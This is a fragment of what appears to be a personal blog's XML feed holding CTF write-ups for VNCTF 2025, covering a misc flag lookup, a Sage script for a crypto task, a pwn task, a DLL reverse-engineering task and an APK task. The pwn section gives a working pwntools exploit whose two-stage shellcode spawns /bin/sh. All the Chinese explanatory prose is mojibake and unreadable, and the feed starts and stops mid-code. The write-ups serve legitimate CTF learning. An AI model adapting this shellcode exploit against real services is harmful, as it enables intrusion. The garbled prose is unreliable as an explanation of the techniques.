i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, md5_and_pad[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h1><p>åŠ¨è°ƒè°ƒè¯•åˆ†æç¨‹åºä¸»ä½“æµç¨‹å¾ˆé‡è¦ï¼Œè¦å…ˆäº†è§£å¤§æ¦‚æ‰§è¡Œæ¡†æ¶æ‰èƒ½é€æ­¥å¾€ä¸‹å±‚åˆ†æï¼Œä¸”ä¸Šå±‚ä¸€äº›ä»£ç æ¡ä»¶æœ‰åŠ©äºä¸‹å±‚çš„åˆ†æã€‚</p><p>ç„¶åè¸©äº†ä¸€ä¸ªä¸¥é‡çš„å‘å°±æ˜¯IDAä¼ªä»£ç é‡Œé¢çš„å˜é‡å€¼å’Œå®é™…å€¼ä¸€äº›æƒ…å†µä¸‹æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¹‹å‰å†™é¢˜æ²¡åœ¨æ„é‚£ä¹ˆå¤šï¼Œè¿™æ¬¡å¾ˆå¤šåœ°æ–¹éƒ½å‘ç°æœ‰è¿™ç§é—®é¢˜ï¼Œå¡äº†æˆ‘åˆ†æå¥½ä¹…ã€‚æ‰€ä»¥å…³é”®ä»£ç æ®µæœ€å¥½ç”¨æ±‡ç¼–é€æ­¥åˆ†æï¼Œçœ‹å®é™…æ•°æ®çš„å˜åŒ–ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5&quot;&gt;&lt;a href=&quot;#å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5&quot; class=&quot;headerlink&quot; title=&quot;å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5&quot;&gt;&lt;/a&gt;å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5&lt;/</summary>
      
    
    
    
    <category term="é€†å‘ç»ƒä¹ " scheme="https://tkazer.github.io/categories/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="https://tkazer.github.io/2025/02/12/VNCTF2025/"/>
    <id>https://tkazer.github.io/2025/02/12/VNCTF2025/</id>
    <published>2025-02-12T14:53:27.000Z</published>
    <updated>2025-02-12T15:10:39.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-2025-WP"><a href="#VNCTF-2025-WP" class="headerlink" title="VNCTF 2025 WP"></a>VNCTF 2025 WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h3><p>IDAåˆ†æVN_Lang_XXXX.exeå­—ç¬¦ä¸²æœç´¢VNå¾—åˆ°Flagã€‚</p><p><img src="/2025/02/12/VNCTF2025/vnlang.png" alt="vnlang"></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{i9UQEqFXgbJBI1LasSZmBxxXSNYFRyCkpydKvhZo7d9Ai}</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>aiä¸€æŠŠæ¢­ã€‚</p><p>dec.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ, PolynomialRing</span><br><span class="line"></span><br><span class="line">R = PolynomialRing(ZZ, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">polynomial = x**<span class="number">3</span> - <span class="number">15264966144147258587171776703005926730518438603688487721465</span>*x**<span class="number">2</span> + <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>*x - <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br><span class="line"></span><br><span class="line">roots = polynomial.roots()</span><br><span class="line">primes = [<span class="built_in">int</span>(r[<span class="number">0</span>]) <span class="keyword">for</span> r <span class="keyword">in</span> roots]</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>]</span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line">square_roots = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    root = power_mod(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p) </span><br><span class="line">    square_roots.append((root, p))</span><br><span class="line"></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="keyword">for</span> signs <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>), (-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)]:</span><br><span class="line">    crt_solution = crt([signs[i] * square_roots[i][<span class="number">0</span>] % primes[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)], primes)</span><br><span class="line">    possible_flags.append(crt_solution)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(possible_flags)</span><br><span class="line"><span class="comment">#[55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350, 125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102, 121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027, 60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459, 325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517, 4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592, 65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160, 69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269]</span></span><br></pre></td></tr></table></figure><p>dec.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p =[<span class="number">55745449774035533604132123837354458550470434042238203561240895515463850669082841278843372190705837595737691650856096087615682512159689935652128349720357413457859444632369350</span>, <span class="number">125115225001407144448151513636019415817956856295873219712252392836948941964102523530173092625214575404136789335483571504152920024161726170211008255272440379726560839152801102</span>, <span class="number">121308689781282565030341210716083690163638176623957028113928015415750030819041672272612041957024041097790808247093717003449846352538078398824952421335589115302596759718820027</span>, <span class="number">60203414044033723113683626590079903689763905879374101193373685550258360403003508805935592269106120673140798276984048897114005911074753100616094921754147882416738708813989459</span>, <span class="number">325714524936805045870599916394859742487396082609853016904206306797799294429908134765584705104874385528562768869049154397624863645707696788955369048469602267457592373819517</span>, <span class="number">4132249745061384463680902836330585396806075754526044615228583727996710439490759392326635373295408691874543857258903655100698535269355468175011202985320866691421671807800592</span>, <span class="number">65237525482310226380338486962334371870680346499108971535782913593488380855528922859003085061213329116524553827368571761436538976732680766383868702566762099577279722712631160</span>, <span class="number">69695489752308415889889989715059817009973818336244869167915703628282890589449590386095305139613612193927660453496524570934862375647743931347835274600552568536158986894251269</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p:</span><br><span class="line">    f_bytes = f.to_bytes((f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_bytes.startswith(<span class="string">b&#x27;VNCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(f_bytes.decode())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ç­¾ä¸ªåˆ°å§"><a href="#ç­¾ä¸ªåˆ°å§" class="headerlink" title="ç­¾ä¸ªåˆ°å§"></a>ç­¾ä¸ªåˆ°å§</h3><p>checksec</p><p><img src="/2025/02/12/VNCTF2025/pwn2.png" alt="QQ_1739074297610"></p><p>IDAåˆ†æpwnç¨‹åº</p><p><img src="/2025/02/12/VNCTF2025/pwn1.png" alt="QQ_1739073892530"></p><p>å‘ç°å°±ç»™22å­—èŠ‚å¤§å°ï¼Œå¯ä»¥å†™ä¸€ä¸ªæ ‡å‡†æœ€çŸ­shellï¼Œä½†æ˜¯executeå‡½æ•°æ¸…ç©ºäº†å¯„å­˜å™¨ã€‚</p><p><img src="/2025/02/12/VNCTF2025/pwn3.png" alt="QQ_1739074388173"></p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡ä¸€æ®µshellcodeå†readä¸€æ¬¡æ›´å¤§çš„ç©ºé—´ã€‚</p><p>æ¥ä¸‹æ¥ç”¨shellcodeè°ƒç”¨&#x2F;bin&#x2F;shå³å¯ã€‚</p><p>å‚è€ƒï¼š<a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode | V3rdantâ€™s Blog</a></p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) </span><br><span class="line"><span class="comment">#p = remote(&quot;node.vnteam.cn&quot;,...)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xchg rdi, rsi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add edx, 0x114</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;try to show your strength \n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;0&#x27;</span>*<span class="number">13</span> + asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x114</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rcx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/VNCTF2025/pwn4.png" alt="QQ_1739075764118"></p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p><strong>åŠ¨æ€å€¼</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Fukoâ€™s-starfish"><a href="#Fukoâ€™s-starfish" class="headerlink" title="Fukoâ€™s starfish"></a><strong>Fukoâ€™s starfish</strong></h3><p>IDAåˆ†æ.exeç¨‹åºå‘ç°æœ€ç»ˆæ¸¸æˆè°ƒç”¨çš„æ˜¯starfish.dllé‡Œé¢çš„å‡½æ•°ï¼Œç¨‹åºæœ¬èº«ä¼¼ä¹æ²¡æœ‰ä¸flagç›¸å…³æ•°æ®ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko1.png" alt="QQ_1739075923934"></p><p>IDAåˆ†æ.dllç¨‹åºçš„play_snakeå‡½æ•°ï¼Œå‘ç°è¾“å‡ºâ€u winâ€ä¸‹é¢åˆ†æ”¯è°ƒç”¨äº†ä¸€ä¸ªCheckå‡½æ•°ï¼ˆæ”¹ååçš„ï¼‰ï¼ŒCheckå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼Œç›´æ¥å°†å›¾2çº¢æ¡†éƒ¨åˆ†nopå³å¯F5åˆ†æã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko2.png" alt="QQ_1739076003936"></p><p><img src="/2025/02/12/VNCTF2025/fuko7.png" alt="QQ_1739076991040"></p><p>å¯ä»¥çœ‹åˆ°å‡½æ•°å†…éƒ¨å°±æ˜¯ä¸»ä½“æµç¨‹ï¼Œè¦è§£å¯†ä¸€æ®µå­—ç¬¦ä¸²è¾“å‡ºç„¶åè¦æ±‚è¾“å…¥ï¼ŒåŠ å¯†æœ€åä¸è¢«åŠ å¯†çš„flagè¿›è¡Œå¯¹æ¯”ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko3.png" alt="QQ_1739076094303"></p><p>è¾“å…¥32é•¿åº¦å­—ç¬¦ä¸²ï¼Œè¢«åˆ†ä¸º16å­—èŠ‚ä¸ºä¸€ä¸ªå•ä½è¿›è¡ŒåŠ å¯†ï¼Œè¿›å…¥åŠ å¯†å‡½æ•°å‘ç°æœ‰è°ƒè¯•å™¨æ£€æµ‹ï¼Œè®©æ•°æ®èµ°ä¸åŒåˆ†æ”¯å¤„ç†ï¼Œç›´æ¥å°†ä¸‹å›¾çº¢æ¡†éƒ¨åˆ†nopè¿›è¡Œpassï¼Œç„¶åå°†jzæ”¹æˆjmpå³å¯ï¼ˆæ‰‹åŠ¨é‡æ–°ç®—ä¸€ä¸‹ç›¸å¯¹åç§»å°±è¡Œï¼‰ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko11.png" alt="QQ_1739077386431"></p><p><img src="/2025/02/12/VNCTF2025/fuko8.png" alt="QQ_1739077338900"></p><p>å¯ä»¥é€šè¿‡ç®—æ³•ç‰¹å¾è¯†åˆ«å‡ºè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†AESåŠ å¯†ï¼Œæ²¡çœ‹å‡ºé­”æ”¹çš„åœ°æ–¹ï¼Œä½†æ˜¯å¯†é’¥æ˜¯ä»å…¨å±€æ•°æ®è·å–å†ç»è¿‡ä¸€é€šè®¡ç®—æ‹¿çš„ï¼Œè®¡ç®—è¿‡ç¨‹ä¸å¥½çœ‹ï¼Œè€ƒè™‘ç”¨åŠ¨è°ƒè·å–ï¼Œå¹¶ä¸”å›¾1éƒ¨åˆ†ç”¨å¯†é’¥ä¸è¾“å…¥è¿›æ¥çš„Inputè¿›è¡Œäº†å¼‚æˆ–ï¼Œå¯ä»¥é€šè¿‡Inputå’Œè¿™æ®µæ•°æ®è¿›è¡Œå¼‚æˆ–è·å–åˆ°å¯†é’¥ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko4.png" alt="QQ_1739076342223"></p><p><img src="/2025/02/12/VNCTF2025/fuko5.png" alt="QQ_1739076365537"></p><p>çœ‹åˆ°DllMainä¼¼ä¹æœ‰åè°ƒè¯•ï¼Œä½†æ˜¯ä¼¼ä¹åªæ‰«æäº†è¿›ç¨‹ï¼Œè€Œä¸”æ²¡æ£€æµ‹idaï¼Œæ‰€ä»¥å°±ä¸ç®¡äº†ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fuko6.png" alt="QQ_1739076850485"></p><p>ç›´æ¥å†™ä¸€ä¸ªç¨‹åºæ¥åŠ è½½è¿™ä¸ªdllæ¥call Checkå‡½æ•°ï¼Œä¾¿äºè°ƒè¯•ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> hLib = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hLib)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> Addr = (DWORD64)hLib + <span class="number">0x25F0</span>;</span><br><span class="line"><span class="built_in">void</span> (*funcPtr)() = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(Addr);</span><br><span class="line"><span class="built_in">funcPtr</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥â€1111111111111111â€ç„¶ååŠ¨è°ƒæ–­ç‚¹åœ¨ä¸‹å›¾æ–­ç‚¹ï¼Œå–å‡ºæ‰€æœ‰å¼‚æˆ–åçš„å€¼ï¼Œç„¶åé‡æ–°ä¸è¾“å…¥å­—ç¬¦å†æ¬¡å¼‚æˆ–æ‹¿åˆ°Key.</p><p><img src="/2025/02/12/VNCTF2025/fuko9.png" alt="QQ_1739077545772"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> Input[] = <span class="string">&quot;1111111111111111&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> c[]&#123; <span class="number">0x38</span>,<span class="number">0xd4</span>,<span class="number">0xCC</span>,<span class="number">0xDA</span>,<span class="number">0x59</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x87</span>,<span class="number">0x80</span>,<span class="number">0x0A</span>,<span class="number">0xB5</span>,<span class="number">0x39</span>,<span class="number">0xA0</span>,<span class="number">0xDA</span>,<span class="number">0x49</span>,<span class="number">0xE3</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, Input[i] ^ c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key</span></span><br><span class="line"><span class="comment">// 09 E5 FD EB 68 31 75 B6 B1 3B 84 08 91 EB 78 D2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†ç”¨cyberchef AESè§£å¯†å¾—åˆ°Flag.</p><p><img src="/2025/02/12/VNCTF2025/fuko10.png" alt="QQ_1739077689242"></p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{W0w_u_g0t_Fuk0â€™s_st4rf1sh}</strong></p><h3 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h3><p>jadxåˆ†æAPK, å‘ç°ä»–ä¼šä¸‹è½½ä¸€ä¸ªhook_fish.dexæ–‡ä»¶, ç„¶åè°ƒç”¨é‡Œé¢çš„checkã€encodeã€decodeå‡½æ•°ã€‚ä½†æ˜¯ä»–åˆä¼šdeleteæ–‡ä»¶ï¼Œæ‰€ä»¥å¾—åŠ¨è°ƒæ–­ç‚¹åœ¨è¿™è¾¹ç„¶åæ‰‹åŠ¨å»å¤åˆ¶ä¸€ä»½æ–‡ä»¶ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fish1.png" alt="QQ_1739078061506"></p><p><img src="/2025/02/12/VNCTF2025/fish2.png" alt="QQ_1739078112517"></p><p>åœ¨deleteå‰æ–­ç‚¹ï¼Œå¯åŠ¨è°ƒè¯•ï¼Œç„¶åè¾“å…¥ç‚¹å‡»æŒ‰é’®æ–­ä¸‹ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸­æœåˆ°hook_fish.dexå¤åˆ¶åˆ°windowsã€‚</p><p><img src="/2025/02/12/VNCTF2025/fish3.png" alt="QQ_1739078448944"></p><p><img src="/2025/02/12/VNCTF2025/fish4.png" alt="QQ_1739078521968"></p><p>jadxåˆ†æhook_fish.dexå¯ä»¥å‘ç°æœ‰ä»¥ä¸‹å‡ ä¸ªå‡½æ•°ï¼Œä»¥åŠä¸€ä¸ªè¢«åŠ å¯†çš„flagã€‚</p><p><img src="/2025/02/12/VNCTF2025/fish5.png" alt="QQ_1739078659633"></p><p>ä½¿ç”¨decodeå‡½æ•°å³å¯è§£å¯†ç¬¬ä¸€å±‚ï¼Œç¬¬äºŒå±‚è§£å¯†å°±æ˜¯ç”¨apké‡Œé¢çš„encryptè¿›è¡Œå†™è§£å¯†å‡½æ•°ã€‚</p><p><img src="/2025/02/12/VNCTF2025/fish6.png" alt="QQ_1739078766431"></p><p>è¿™è¾¹å‘ç°åŠ å¯†åçš„1å­—èŠ‚å¯¹2å­—èŠ‚çš„ï¼Œä¹Ÿå°±æ˜¯ä»é€å­—èŠ‚å¾€åæ·»åŠ è¿›è¡Œçˆ†ç ´ï¼Œå…å¾—å†™è§£å¯†å‡½æ•°äº†ã€‚</p><p>å®Œæ•´è§£å¯†ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span 